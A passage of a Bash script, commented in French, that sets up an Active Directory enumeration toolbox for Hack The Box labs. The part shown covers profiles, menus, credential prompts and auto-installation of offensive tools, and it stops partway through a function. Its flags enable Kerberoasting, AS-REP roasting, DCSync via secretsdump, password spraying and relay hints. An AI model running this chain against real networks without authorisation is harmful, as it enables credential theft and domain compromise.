#!/usr/bin/env bash
set -euo pipefail

# ============================================================
# htbtoolbox.sh - moteur d'enumeration AD/HTB pour HTB Toolbox
# + Fonctionne en mode CLI autonome et lorsqu'il est sourcé par le backend web
# + Auto-détection NXC (modules + options)
# + Sondage dynamique (uniquement les options supportées)
# + Test automatique des formats de nom d'utilisateur (user / DOMAIN\user / user@domain)
# + Sortie JSON enum4linux-ng + parsing jq
# ============================================================
#
# Mode CLI autonome :
#   chmod +x htbtoolbox.sh
#   ./htbtoolbox.sh
#
# Surcharges d'environnement :
#   TARGET=10.10.10.10 DOMAIN=corp.local DC=dc01.corp.local ./htbtoolbox.sh
#   OUTDIR=loot ./htbtoolbox.sh
#   AUTO_HOSTS=1 ./htbtoolbox.sh
#   DO_ASREP=0 ./htbtoolbox.sh
#   RID_BRUTE=1 ./htbtoolbox.sh   # optionnel / bruyant
#   NMAP_SCAN=0 WEB_ENUM=0 NTP_SYNC=0 BLOODHOUND=0 ./htbtoolbox.sh
#
# Utilisation depuis le backend web :
#   source ./htbtoolbox.sh && htbtoolbox_init_web && phase_<name>
# ============================================================

if [ -z "${BASH_VERSION:-}" ]; then
  echo "[!] Ce script doit être exécuté avec bash, pas avec sh."
  echo "    Utilise : chmod +x htbtoolbox.sh && ./htbtoolbox.sh"
  exit 1
fi

umask 077

# ----------------------------
# Runtime configuration
# ----------------------------
TARGET="${TARGET:-10.129.18.213}"
DOMAIN="${DOMAIN:-pirate.htb}"
DC="${DC:-DC01.pirate.htb}"
OUTDIR="${OUTDIR:-}"
MAX_SHARES="${MAX_SHARES:-8}"
STRICT_USERS="${STRICT_USERS:-1}"      # 1 safe; 0 noisy tokens
AUTO_HOSTS="${AUTO_HOSTS:-0}"          # default OFF
WINRM_CHECK="${WINRM_CHECK:-1}"        # default ON (safe)
DO_ASREP="${DO_ASREP:-1}"              # default ON
RID_BRUTE="${RID_BRUTE:-0}"            # default OFF
ANON_NXC_PROBE="${ANON_NXC_PROBE:-1}"  # try anonymous nxc probes when no creds
ANON_RID_BRUTE="${ANON_RID_BRUTE:-0}"  # optional/noisy in anonymous mode
KERB_USER_ENUM="${KERB_USER_ENUM:-1}"  # try kerbrute userenum to populate users.txt
USER_WORDLIST="${USER_WORDLIST:-/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt}"
KERB_TIMEOUT_SECS="${KERB_TIMEOUT_SECS:-240}"  # max runtime for kerb user enum
KERB_MAX_USERS="${KERB_MAX_USERS:-50000}"      # cap users from wordlist to avoid very long runs
ENUM4LINUX="${ENUM4LINUX:-1}"          # run enum4linux-ng when available
NMAP_SCAN="${NMAP_SCAN:-1}"            # run nmap baseline recon
WEB_ENUM="${WEB_ENUM:-1}"              # run web discovery (content + dirs/vhosts)
NTP_SYNC="${NTP_SYNC:-1}"              # sync/check time against DC for Kerberos
BLOODHOUND="${BLOODHOUND:-1}"          # run bloodhound-python collection if creds work
LDAPDOMAINDUMP="${LDAPDOMAINDUMP:-1}"  # run ldapdomaindump when LDAP auth works
CERTIPY="${CERTIPY:-1}"                # ensure certipy-ad is installed
BLOODYAD="${BLOODYAD:-1}"              # ensure bloodyAD is installed
DNS_ENUM="${DNS_ENUM:-1}"              # run DNS-focused AD enumeration
KERBEROAST="${KERBEROAST:-1}"          # request TGS for SPN accounts when possible
ADCS_ENUM="${ADCS_ENUM:-1}"            # run certipy-ad find when ADCS may be present
BLOODYAD_ENUM="${BLOODYAD_ENUM:-1}"    # run safe bloodyAD discovery checks
MSSQL_ENUM="${MSSQL_ENUM:-1}"          # run authenticated MSSQL enumeration when reachable
GPO_PARSE="${GPO_PARSE:-1}"            # parse SYSVOL/GPO loot for common wins
AUTO_INSTALL_TOOLS="${AUTO_INSTALL_TOOLS:-1}"  # auto-install missing tools via apt/pipx/GitHub
RUN_PROFILE="${RUN_PROFILE:-full}"     # full | htb | ldap | smb | custom
PHASE_PACK="${PHASE_PACK:-all}"        # all | recon | enum | loot | custom
WEB_WORDLIST="${WEB_WORDLIST:-/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt}"
SECRETSDUMP="${SECRETSDUMP:-1}"        # impacket-secretsdump DCSync/SAM quand droits confirmés
SPRAY="${SPRAY:-0}"                    # password spray (default OFF - noisy)
SPRAY_PASS="${SPRAY_PASS:-}"           # mot de passe à sprayer
SNMP_ENUM="${SNMP_ENUM:-1}"            # énumération SNMP
FTP_ENUM="${FTP_ENUM:-1}"              # énumération FTP
HASH_HINTS="${HASH_HINTS:-1}"          # afficher hints hashcat/john pour les hashes capturés
POSTAUTH_HINTS="${POSTAUTH_HINTS:-1}"  # hints post-auth psexec/wmiexec/evil-winrm
SMB_SIGNING="${SMB_SIGNING:-1}"        # vérifier SMB signing (prep relay)
RELAY_HINTS="${RELAY_HINTS:-1}"        # hints responder/ntlmrelayx
LDAPS_ENUM="${LDAPS_ENUM:-1}"          # probe LDAPS port 636

# Credential variables (avoid USER/PASS env conflicts)
AUTH_MODE="${AUTH_MODE:-0}"
AD_USER_RAW="${AD_USER_RAW:-}"
AD_PASS="${AD_PASS:-}"

# Best username format selected after auth probing
AD_USER_BEST="${AD_USER_BEST:-}"

# ----------------------------
# Colors / logging helpers
# ----------------------------
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

log()     { echo -e "${YELLOW}[*] $*${NC}"; }
good()    { echo -e "${GREEN}[+] $*${NC}"; }
bad()     { echo -e "${RED}[!] $*${NC}"; }
section() { echo -e "\n${BOLD}${CYAN}==============================${NC}"; echo -e "${BOLD}${CYAN}  $*${NC}"; echo -e "${BOLD}${CYAN}==============================${NC}\n"; }

have() { command -v "$1" >/dev/null 2>&1; }
need() { have "$1" || { bad "Dépendance manquante : $1"; exit 1; }; }
PATH="$PATH:$HOME/.local/bin:/root/.local/bin"

mask_pass() {
  if [ -n "${AD_PASS:-}" ]; then
    local esc
    esc="$(printf '%s' "$AD_PASS" | sed -e 's/[][(){}.^$*+?|\\\/&]/\\&/g')"
    sed -E "s/${esc}/****/g"
  else
    cat
  fi
}

is_ipv4() {
  local ip="$1"
  [[ "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
  awk -F. '{for(i=1;i<=4;i++) if($i<0 || $i>255) exit 1; exit 0}' <<< "$ip"
}

is_bool_01() {
  [ "$1" = "0" ] || [ "$1" = "1" ]
}

APT_UPDATED=0
INSTALL_ERRORS=0
TOOLING_SUMMARY=""

append_tooling_summary() {
  local line="$1"
  TOOLING_SUMMARY+="${line}"$'\n'
}

record_present_tool() {
  local label="$1"
  local bin="$2"
  if have "$bin"; then
    append_tooling_summary "[OK]    ${label}|${bin}|present|$(command -v "$bin")"
  fi
}

tooling_summary_block() {
  if [ -n "${TOOLING_SUMMARY:-}" ]; then
    printf "%s" "$TOOLING_SUMMARY"
  fi
}

run_priv() {
  if [ "$(id -u)" = "0" ]; then
    "$@"
    return
  fi

  if have sudo; then
    if [ -n "${SUDO_PASS:-}" ]; then
      printf '%s\n' "$SUDO_PASS" | sudo -S -p '' "$@"
      return
    fi
    sudo "$@"
    return
  fi

  return 1
}

apt_update_once() {
  if [ "$APT_UPDATED" = "1" ]; then
    return 0
  fi
  if ! have apt-get; then
    return 1
  fi

  log "Exécution de apt-get update..."
  if run_priv apt-get update; then
    APT_UPDATED=1
    return 0
  fi

  return 1
}

install_apt_pkg() {
  local pkg="$1"
  if ! have apt-get; then
    return 1
  fi
  apt_update_once || return 1
  log "Installation du paquet apt : $pkg"
  run_priv apt-get install -y "$pkg"
}

install_pipx_spec() {
  local spec="$1"
  if ! have pipx; then
    if have apt-get; then
      install_apt_pkg pipx || return 1
    else
      return 1
    fi
  fi

  log "Installation via pipx : $spec"
  pipx install --force "$spec"
}

ensure_tool() {
  local bin="$1"
  local label="$2"
  local apt_pkg="${3:-}"
  local pipx_spec="${4:-}"

  if have "$bin"; then
    good "$label trouvé : $(command -v "$bin")"
    append_tooling_summary "[OK]    ${label}|${bin}|present|$(command -v "$bin")"
    return 0
  fi

  if [ "$AUTO_INSTALL_TOOLS" != "1" ]; then
    bad "$label manquant ($bin). AUTO_INSTALL_TOOLS=0, installation ignorée."
    append_tooling_summary "[MISS]  ${label}|${bin}|missing|auto-install disabled"
    INSTALL_ERRORS=$((INSTALL_ERRORS + 1))
    return 1
  fi

  log "$label manquant -> tentative d'installation"

  if [ -n "$apt_pkg" ]; then
    install_apt_pkg "$apt_pkg" || true
    hash -r 2>/dev/null || true
    if have "$bin"; then
      good "$label installé via apt"
      append_tooling_summary "[INST]  ${label}|${bin}|installed|apt:${apt_pkg}"
      return 0
    fi
  fi

  if [ -n "$pipx_spec" ]; then
    install_pipx_spec "$pipx_spec" || true
    hash -r 2>/dev/null || true
    if have "$bin"; then
      good "$label installé via pipx/GitHub"
      append_tooling_summary "[INST]  ${label}|${bin}|installed|pipx:${pipx_spec}"
      return 0
    fi
  fi

  bad "Impossible d'installer automatiquement $label."
  append_tooling_summary "[FAIL]  ${label}|${bin}|failed|auto-install failed"
  INSTALL_ERRORS=$((INSTALL_ERRORS + 1))
  return 1
}

show_profiles_menu() {
  echo
  echo "Profils d'énumération :"
  echo "  1) Pentest AD complet"
  echo "  2) HTB quick win"
  echo "  3) Focus LDAP/Kerberos"
  echo "  4) Focus SMB/Loot"
  echo "  5) Personnalisé"
}

show_phase_packs_menu() {
  echo
  echo "Packs de phases :"
  echo "  1) Toutes les phases"
  echo "  2) Recon seulement"
  echo "  3) Auth + énumération annuaire"
  echo "  4) Loot + post-auth"
  echo "  5) Personnalisé"
}

apply_run_profile() {
  case "$RUN_PROFILE" in
    full)
      AUTO_HOSTS=1
      ANON_NXC_PROBE=1
      KERB_USER_ENUM=1
      ENUM4LINUX=1
      LDAPDOMAINDUMP=1
      CERTIPY=1
      BLOODYAD=1
      DNS_ENUM=1
      KERBEROAST=1
      ADCS_ENUM=1
      BLOODYAD_ENUM=1
      MSSQL_ENUM=1
      GPO_PARSE=1
      DO_ASREP=1
      NMAP_SCAN=1
      WEB_ENUM=1
      NTP_SYNC=1
      BLOODHOUND=1
      SECRETSDUMP=1
      SNMP_ENUM=1
      FTP_ENUM=1
      HASH_HINTS=1
      POSTAUTH_HINTS=1
      SMB_SIGNING=1
      RELAY_HINTS=1
      LDAPS_ENUM=1
      SPRAY=0
      ;;
    htb)
      AUTO_HOSTS=1
      ANON_NXC_PROBE=1
      ANON_RID_BRUTE=0
      KERB_USER_ENUM=1
      ENUM4LINUX=1
      LDAPDOMAINDUMP=1
      CERTIPY=1
      BLOODYAD=1
      DNS_ENUM=1
      KERBEROAST=1
      ADCS_ENUM=1
      BLOODYAD_ENUM=1
      MSSQL_ENUM=1
      GPO_PARSE=1
      DO_ASREP=1
      NMAP_SCAN=1
      WEB_ENUM=0
      NTP_SYNC=1
      BLOODHOUND=1
      SECRETSDUMP=1
      SNMP_ENUM=1
      FTP_ENUM=1
      HASH_HINTS=1
      POSTAUTH_HINTS=1
      SMB_SIGNING=1
      RELAY_HINTS=1
      LDAPS_ENUM=1
      SPRAY=0
      ;;
    ldap)
      AUTO_HOSTS=1
      ANON_NXC_PROBE=0
      ANON_RID_BRUTE=0
      KERB_USER_ENUM=1
      ENUM4LINUX=0
      LDAPDOMAINDUMP=1
      CERTIPY=1
      BLOODYAD=1
      DNS_ENUM=1
      KERBEROAST=1
      ADCS_ENUM=1
      BLOODYAD_ENUM=1
      MSSQL_ENUM=0
      GPO_PARSE=0
      DO_ASREP=1
      NMAP_SCAN=0
      WEB_ENUM=0
      NTP_SYNC=1
      BLOODHOUND=1
      SECRETSDUMP=0
      SNMP_ENUM=0
      FTP_ENUM=0
      HASH_HINTS=1
      POSTAUTH_HINTS=1
      SMB_SIGNING=1
      RELAY_HINTS=1
      LDAPS_ENUM=1
      SPRAY=0
      ;;
    smb)
      AUTO_HOSTS=0
      ANON_NXC_PROBE=1
      ANON_RID_BRUTE=0
      KERB_USER_ENUM=0
      ENUM4LINUX=1
      LDAPDOMAINDUMP=0
      CERTIPY=0
      BLOODYAD=0
      DNS_ENUM=0
      KERBEROAST=0
      ADCS_ENUM=0
      BLOODYAD_ENUM=0
      MSSQL_ENUM=0
      GPO_PARSE=1
      DO_ASREP=0
      NMAP_SCAN=1
      WEB_ENUM=0
      NTP_SYNC=0
      BLOODHOUND=0
      SECRETSDUMP=0
      SNMP_ENUM=0
      FTP_ENUM=0
      HASH_HINTS=1
      POSTAUTH_HINTS=0
      SMB_SIGNING=1
      RELAY_HINTS=1
      LDAPS_ENUM=0
      SPRAY=0
      ;;
    custom) ;;
    *) RUN_PROFILE="full"; apply_run_profile ;;
  esac
}

apply_phase_pack() {
  case "$PHASE_PACK" in
    all) ;;
    recon)
      DO_ASREP=0
      KERB_USER_ENUM=0
      LDAPDOMAINDUMP=0
      BLOODHOUND=0
      KERBEROAST=0
      ADCS_ENUM=0
      BLOODYAD_ENUM=0
      MSSQL_ENUM=0
      ;;
    enum)
      NMAP_SCAN=0
      WEB_ENUM=0
      DO_ASREP=1
      KERB_USER_ENUM=1
      LDAPDOMAINDUMP=1
      BLOODHOUND=1
      KERBEROAST=1
      ADCS_ENUM=1
      BLOODYAD_ENUM=1
      ;;
    loot)
      NMAP_SCAN=0
      WEB_ENUM=0
      KERB_USER_ENUM=0
      ENUM4LINUX=0
      NTP_SYNC=0
      BLOODHOUND=0
      LDAPDOMAINDUMP=0
      KERBEROAST=0
      ADCS_ENUM=0
      BLOODYAD_ENUM=0
      MSSQL_ENUM=0
      ;;
    custom) ;;
    *) PHASE_PACK="all" ;;
  esac
}

show_operation_plan() {
  section "Plan d'exécution"
  echo "Profil :         $RUN_PROFILE"
  echo "Pack de phases : $PHASE_PACK"
  echo "Mode d'auth :    $AUTH_MODE"
  echo "Cible :          $TARGET"
  echo "Domaine/DC :     $DOMAIN / $DC"
  echo "Modules :"
  echo "  Recon          NMAP=$NMAP_SCAN WEB=$WEB_ENUM NTP=$NTP_SYNC AUTO_HOSTS=$AUTO_HOSTS"
  echo "  Accès          ANON_NXC=$ANON_NXC_PROBE KERB_USER_ENUM=$KERB_USER_ENUM DO_ASREP=$DO_ASREP"
  echo "  Annuaire       ENUM4LINUX=$ENUM4LINUX LDAPDOMAINDUMP=$LDAPDOMAINDUMP BLOODHOUND=$BLOODHOUND DNS=$DNS_ENUM"
  echo "  Attack Paths   KERBEROAST=$KERBEROAST ADCS=$ADCS_ENUM BLOODYAD_ENUM=$BLOODYAD_ENUM MSSQL_ENUM=$MSSQL_ENUM GPO_PARSE=$GPO_PARSE"
  echo "  Outils         CERTIPY=$CERTIPY BLOODYAD=$BLOODYAD AUTO_INSTALL_TOOLS=$AUTO_INSTALL_TOOLS"
  echo "  Étendu         SNMP=$SNMP_ENUM FTP=$FTP_ENUM SMB_SIGNING=$SMB_SIGNING LDAPS=$LDAPS_ENUM"
  echo "  Post-auth      SECRETSDUMP=$SECRETSDUMP SPRAY=$SPRAY HASH_HINTS=$HASH_HINTS POSTAUTH_HINTS=$POSTAUTH_HINTS RELAY_HINTS=$RELAY_HINTS"
}

main_menu() {
  if [ ! -t 0 ]; then
    apply_run_profile
    apply_phase_pack
    return
  fi

  # CLI interactive uniquement. Le frontend web appelle directement les phases.
  section "Menu d'énumération"
  show_profiles_menu
  local profile_choice
  read -rp "Sélection du profil [1] : " profile_choice
  case "${profile_choice:-1}" in
    1) RUN_PROFILE="full" ;;
    2) RUN_PROFILE="htb" ;;
    3) RUN_PROFILE="ldap" ;;
    4) RUN_PROFILE="smb" ;;
    5) RUN_PROFILE="custom" ;;
    *) RUN_PROFILE="full" ;;
  esac

  show_phase_packs_menu
  local pack_choice
  read -rp "Sélection du pack de phases [1] : " pack_choice
  case "${pack_choice:-1}" in
    1) PHASE_PACK="all" ;;
    2) PHASE_PACK="recon" ;;
    3) PHASE_PACK="enum" ;;
    4) PHASE_PACK="loot" ;;
    5) PHASE_PACK="custom" ;;
    *) PHASE_PACK="all" ;;
  esac

  apply_run_profile
  apply_phase_pack

  good "Profil sélectionné=$RUN_PROFILE pack_de_phases=$PHASE_PACK"
}

validate_config() {
  TARGET="$(echo "$TARGET" | tr -d '[:space:]')"
  DOMAIN="$(echo "$DOMAIN" | tr '[:upper:]' '[:lower:]' | tr -d '[:space:]')"
  DC="$(echo "$DC" | tr '[:upper:]' '[:lower:]' | tr -d '[:space:]')"

  if ! is_ipv4 "$TARGET"; then
    bad "TARGET doit être une adresse IPv4 valide. Reçu : $TARGET"
    exit 1
  fi

  if ! echo "$DOMAIN" | grep -Eq '^[a-z0-9][a-z0-9.-]*[a-z0-9]$'; then
    bad "DOMAIN semble invalide : $DOMAIN"
    exit 1
  fi

  if ! echo "$DC" | grep -Eq '^[a-z0-9][a-z0-9.-]*[a-z0-9]$'; then
    bad "DC semble invalide : $DC"
    exit 1
  fi

  for b in AUTO_HOSTS WINRM_CHECK DO_ASREP RID_BRUTE STRICT_USERS ANON_NXC_PROBE ANON_RID_BRUTE KERB_USER_ENUM ENUM4LINUX NMAP_SCAN WEB_ENUM NTP_SYNC BLOODHOUND LDAPDOMAINDUMP CERTIPY BLOODYAD DNS_ENUM KERBEROAST ADCS_ENUM BLOODYAD_ENUM MSSQL_ENUM GPO_PARSE AUTO_INSTALL_TOOLS SECRETSDUMP SPRAY SNMP_ENUM FTP_ENUM HASH_HINTS POSTAUTH_HINTS SMB_SIGNING RELAY_HINTS LDAPS_ENUM; do
    if ! is_bool_01 "${!b}"; then
      bad "$b doit valoir 0 ou 1 (reçu : ${!b})"
      exit 1
    fi
  done

  if ! echo "$DC" | grep -qiF "$DOMAIN"; then
    log "Attention : DC ($DC) ne semble pas appartenir à DOMAIN ($DOMAIN)."
  fi
}

# ----------------------------
# Credential collection
# ----------------------------
ask_creds() {
  echo
  local has_baked_creds=0
  if [ -n "${AD_USER_RAW:-}" ] && [ -n "${AD_PASS:-}" ]; then
    has_baked_creds=1
  fi

  if [ ! -t 0 ]; then
    if [ "$has_baked_creds" = "1" ]; then
      AUTH_MODE=1
      good "Mode non interactif : utilisation des identifiants configurés pour '${AD_USER_RAW}'."
    else
      AUTH_MODE=0
      log "Mode non interactif sans identifiants configurés : exécution en anonyme."
    fi
    return
  fi

  read -rp "As-tu des identifiants de domaine ? (y/N) : " ans
  case "$ans" in
    y|Y|yes|YES)
      AUTH_MODE=1
      if [ "$has_baked_creds" = "1" ]; then
        local use_baked
        read -rp "Utiliser les identifiants configurés pour '${AD_USER_RAW}' ? [Y/n] : " use_baked
        case "${use_baked:-}" in
          n|N|no|NO)
            read -rp "Nom d'utilisateur (sqlsvc / DOMAIN\\sqlsvc / user@domain) : " AD_USER_RAW
            read -rsp "Mot de passe : " AD_PASS
            echo
            ;;
          *)
            good "Utilisation des identifiants configurés pour '${AD_USER_RAW}'."
            local pass_in
            read -rsp "Remplacer le mot de passe (Entrée pour conserver l'actuel) : " pass_in
            echo
            if [ -n "${pass_in:-}" ]; then
              AD_PASS="$pass_in"
            fi
            ;;
        esac
      else
        read -rp "Nom d'utilisateur (sqlsvc / DOMAIN\\sqlsvc / user@domain) : " AD_USER_RAW
        read -rsp "Mot de passe : " AD_PASS
        echo
      fi

      read -rp "Surcharge du domaine [$DOMAIN] : " dom_in
      if [ -n "${dom_in:-}" ]; then
        DOMAIN="$dom_in"
      fi
      echo
      good "Identifiants chargés."
      ;;
    *)
      AUTH_MODE=0
      log "Exécution en mode anonyme."
      ;;
  esac
}

prompt_yn_default() {
  local question="$1"
  local current="$2"
  local ans
  local suffix="[y/N]"
  [ "$current" = "1" ] && suffix="[Y/n]"
  read -rp "$question $suffix: " ans
  case "${ans:-}" in
    y|Y|yes|YES) echo "1" ;;
    n|N|no|NO) echo "0" ;;
    "") echo "$current" ;;
    *) echo "$current" ;;
  esac
}

interactive_options() {
  if [ ! -t 0 ]; then
    return
  fi

  echo
  log "Options interactives du run (Entrée pour conserver les valeurs du profil)"
  AUTO_HOSTS="$(prompt_yn_default "Mettre à jour /etc/hosts automatiquement ?" "$AUTO_HOSTS")"
  ANON_NXC_PROBE="$(prompt_yn_default "Lancer l'autoprobe NXC anonyme ?" "$ANON_NXC_PROBE")"
  ANON_RID_BRUTE="$(prompt_yn_default "Activer le RID brute anonyme (bruyant) ?" "$ANON_RID_BRUTE")"
  KERB_USER_ENUM="$(prompt_yn_default "Lancer l'énumération Kerberos des utilisateurs (kerbrute/GetNPUsers) ?" "$KERB_USER_ENUM")"
  ENUM4LINUX="$(prompt_yn_default "Lancer enum4linux-ng (mode JSON) ?" "$ENUM4LINUX")"
  LDAPDOMAINDUMP="$(prompt_yn_default "Lancer ldapdomaindump ?" "$LDAPDOMAINDUMP")"
  DNS_ENUM="$(prompt_yn_default "Lancer l'énumération DNS AD ?" "$DNS_ENUM")"
  KERBEROAST="$(prompt_yn_default "Lancer Kerberoast si possible ?" "$KERBEROAST")"
  ADCS_ENUM="$(prompt_yn_default "Lancer l'énumération ADCS (Certipy) ?" "$ADCS_ENUM")"
  BLOODYAD_ENUM="$(prompt_yn_default "Lancer les vérifications bloodyAD sûres ?" "$BLOODYAD_ENUM")"
  MSSQL_ENUM="$(prompt_yn_default "Lancer l'énumération MSSQL si disponible ?" "$MSSQL_ENUM")"
  GPO_PARSE="$(prompt_yn_default "Parser le loot GPO/SYSVOL ?" "$GPO_PARSE")"
  CERTIPY="$(prompt_yn_default "S'assurer que certipy-ad est installé ?" "$CERTIPY")"
  BLOODYAD="$(prompt_yn_default "S'assurer que bloodyAD est installé ?" "$BLOODYAD")"
  AUTO_INSTALL_TOOLS="$(prompt_yn_default "Installer automatiquement les outils manquants ?" "$AUTO_INSTALL_TOOLS")"
  DO_ASREP="$(prompt_yn_default "Lancer la vérification AS-REP roast ?" "$DO_ASREP")"
  NMAP_SCAN="$(prompt_yn_default "Lancer le scan nmap de base ?" "$NMAP_SCAN")"
  WEB_ENUM="$(prompt_yn_default "Lancer la découverte web (dirs/vhosts) ?" "$WEB_ENUM")"
  NTP_SYNC="$(prompt_yn_default "Synchroniser/vérifier l'heure via ntpdate ?" "$NTP_SYNC")"
  BLOODHOUND="$(prompt_yn_default "Lancer la collecte bloodhound-python ?" "$BLOODHOUND")"
  SNMP_ENUM="$(prompt_yn_default "Lancer l'énumération SNMP ?" "$SNMP_ENUM")"
  FTP_ENUM="$(prompt_yn_default "Lancer l'énumération FTP ?" "$FTP_ENUM")"
  SMB_SIGNING="$(prompt_yn_default "Vérifier SMB signing (préparation relay) ?" "$SMB_SIGNING")"
  RELAY_HINTS="$(prompt_yn_default "Afficher les hints NTLM relay (responder/ntlmrelayx) ?" "$RELAY_HINTS")"
  LDAPS_ENUM="$(prompt_yn_default "Sonder LDAPS (port 636) ?" "$LDAPS_ENUM")"
  SECRETSDUMP="$(prompt_yn_default "Lancer secretsdump si des droits Domain Admin sont détectés ?" "$SECRETSDUMP")"
  HASH_HINTS="$(prompt_yn_default "Afficher les hints hashcat/john pour les hashes capturés ?" "$HASH_HINTS")"
  POSTAUTH_HINTS="$(prompt_yn_default "Afficher les hints de mouvement latéral post-auth ?" "$POSTAUTH_HINTS")"
  SPRAY="$(prompt_yn_default "Lancer un password spray (BRUYANT - confirmer pour activer) ?" "$SPRAY")"
  if [ "$SPRAY" = "1" ] && [ -z "${SPRAY_PASS:-}" ]; then
    read -rp "Mot de passe à sprayer : " SPRAY_PASS
  fi

  good "Profil interactif sélectionné :"
  echo "    AUTO_HOSTS=$AUTO_HOSTS ANON_NXC_PROBE=$ANON_NXC_PROBE ANON_RID_BRUTE=$ANON_RID_BRUTE"
  echo "    KERB_USER_ENUM=$KERB_USER_ENUM ENUM4LINUX=$ENUM4LINUX LDAPDOMAINDUMP=$LDAPDOMAINDUMP DNS_ENUM=$DNS_ENUM"
  echo "    KERBEROAST=$KERBEROAST ADCS_ENUM=$ADCS_ENUM BLOODYAD_ENUM=$BLOODYAD_ENUM MSSQL_ENUM=$MSSQL_ENUM GPO_PARSE=$GPO_PARSE"
  echo "    CERTIPY=$CERTIPY BLOODYAD=$BLOODYAD AUTO_INSTALL_TOOLS=$AUTO_INSTALL_TOOLS DO_ASREP=$DO_ASREP"
  echo "    NMAP_SCAN=$NMAP_SCAN WEB_ENUM=$WEB_ENUM NTP_SYNC=$NTP_SYNC BLOODHOUND=$BLOODHOUND"
}

# ----------------------------
# Target / output selection
# ----------------------------
choose_outdir() {
  local default_outdir="${OUTDIR:-$DOMAIN}"
  if [ ! -t 0 ]; then
    OUTDIR="$default_outdir"
    return
  fi

  echo
  read -rp "Répertoire de sortie [$default_outdir] : " out_in
  if [ -n "${out_in:-}" ]; then
    OUTDIR="$out_in"
  else
    OUTDIR="$default_outdir"
  fi
}

choose_target() {
  if [ ! -t 0 ]; then
    return
  fi

  echo
  read -rp "IP cible [$TARGET] : " target_in
  if [ -n "${target_in:-}" ]; then
    TARGET="$target_in"
  fi
}

setup_output_dir() {
  OUTDIR="${OUTDIR:-$DOMAIN}"
  mkdir -p "$OUTDIR"
  cd "$OUTDIR"
  mkdir -p smb_shares smb_shares/inventory downloads attack_checks attack_checks/nxc_probe web_enum enum4linux ldapdomaindump dns_enum adcs bloodyad mssql_enum winrm_enum gpo kerberos snmp_enum ftp_enum relay_hints hosts_discovery
}

fix_outdir_perms_for_kali() {
  local owner_user="${SUDO_USER:-kali}"
  local owner_group="$owner_user"
  local target_dir="$OUTDIR"

  chmod -R u+rwX "$target_dir" 2>/dev/null || true

  if [ "$(id -u)" = "0" ]; then
    if getent passwd "$owner_user" >/dev/null 2>&1; then
      if ! getent group "$owner_group" >/dev/null 2>&1; then
        owner_group="kali"
      fi
      chown -R "${owner_user}:${owner_group}" "$target_dir" 2>/dev/null || true
      find "$target_dir" -type d -exec chmod 750 {} \; 2>/dev/null || true
      find "$target_dir" -type f -exec chmod 640 {} \; 2>/dev/null || true
      chmod -R u+rwX "$target_dir" 2>/dev/null || true
      good "Propriétaire/permissions de l'arborescence corrigés pour '${owner_user}' : $target_dir"
    else
      log "Utilisateur '${owner_user}' introuvable, chown ignoré sur $target_dir"
    fi
  fi
}

# ----------------------------
# Dépendances
# ----------------------------
GETNPUSERS_BIN=""
GETUSERSPNS_BIN=""
MSSQLCLIENT_BIN=""
SMB_ENUM_TOOL=""

htbtoolbox_fast_tooling_init() {
  GETNPUSERS_BIN=""
  GETUSERSPNS_BIN=""
  MSSQLCLIENT_BIN=""

  have impacket-GetNPUsers && GETNPUSERS_BIN="impacket-GetNPUsers"
  [ -z "$GETNPUSERS_BIN" ] && have impacket-getnpusers && GETNPUSERS_BIN="impacket-getnpusers"

  have impacket-GetUserSPNs && GETUSERSPNS_BIN="impacket-GetUserSPNs"
  [ -z "$GETUSERSPNS_BIN" ] && have impacket-getuserspns && GETUSERSPNS_BIN="impacket-getuserspns"

  have impacket-mssqlclient && MSSQLCLIENT_BIN="impacket-mssqlclient"
  [ -z "$MSSQLCLIENT_BIN" ] && have mssqlclient.py && MSSQLCLIENT_BIN="mssqlclient.py"

  if have nxc; then
    SMB_ENUM_TOOL="nxc"
  elif have crackmapexec; then
    SMB_ENUM_TOOL="crackmapexec"
  else
    return 1
  fi

  return 0
}

htbtoolbox_init_tooling() {
  local cache_file=""
  if [ -n "${OUTDIR:-}" ]; then
    cache_file="${OUTDIR}/.htbtoolbox_tooling_ok"
  fi

  if [ "${HTB_WEB_FAST_INIT:-0}" = "1" ] && [ -n "$cache_file" ] && [ -f "$cache_file" ]; then
    htbtoolbox_fast_tooling_init || return 1
    return 0
  fi

  section "Vérification des dépendances"
  ensure_tool tee "tee" coreutils
  ensure_tool grep "grep" grep
  ensure_tool awk "awk" gawk
  ensure_tool sed "sed" sed
  ensure_tool sort "sort" coreutils
  ensure_tool tr "tr" coreutils
  ensure_tool getent "getent" libc-bin
  ensure_tool smbclient "smbclient" smbclient
  ensure_tool ldapsearch "ldapsearch" ldap-utils
  ensure_tool rpcclient "rpcclient" samba-common-bin
  ensure_tool git "git" git

  GETNPUSERS_BIN=""
  GETUSERSPNS_BIN=""
  MSSQLCLIENT_BIN=""

  if [ "$DO_ASREP" = "1" ]; then
    if have impacket-GetNPUsers; then
      GETNPUSERS_BIN="impacket-GetNPUsers"
      good "impacket-GetNPUsers trouvé : $(command -v impacket-GetNPUsers)"
      record_present_tool "Impacket GetNPUsers" "impacket-GetNPUsers"
    elif have impacket-getnpusers; then
      GETNPUSERS_BIN="impacket-getnpusers"
      good "impacket-getnpusers trouvé : $(command -v impacket-getnpusers)"
      record_present_tool "Impacket GetNPUsers" "impacket-getnpusers"
    else
      ensure_tool impacket-getnpusers "Impacket GetNPUsers" python3-impacket "git+https://github.com/fortra/impacket.git" || true
      hash -r 2>/dev/null || true
      if have impacket-GetNPUsers; then
        GETNPUSERS_BIN="impacket-GetNPUsers"
      elif have impacket-getnpusers; then
        GETNPUSERS_BIN="impacket-getnpusers"
      fi
    fi
  fi

  if [ "$KERBEROAST" = "1" ]; then
    if have impacket-GetUserSPNs; then
      GETUSERSPNS_BIN="impacket-GetUserSPNs"
      record_present_tool "Impacket GetUserSPNs" "impacket-GetUserSPNs"
    elif have impacket-getuserspns; then
      GETUSERSPNS_BIN="impacket-getuserspns"
      record_present_tool "Impacket GetUserSPNs" "impacket-getuserspns"
    else
      ensure_tool impacket-getuserspns "Impacket GetUserSPNs" python3-impacket "git+https://github.com/fortra/impacket.git" || true
      hash -r 2>/dev/null || true
      if have impacket-GetUserSPNs; then
        GETUSERSPNS_BIN="impacket-GetUserSPNs"
      elif have impacket-getuserspns; then
        GETUSERSPNS_BIN="impacket-getuserspns"
      fi
    fi
  fi

  if [ "$MSSQL_ENUM" = "1" ]; then
    if have impacket-mssqlclient; then
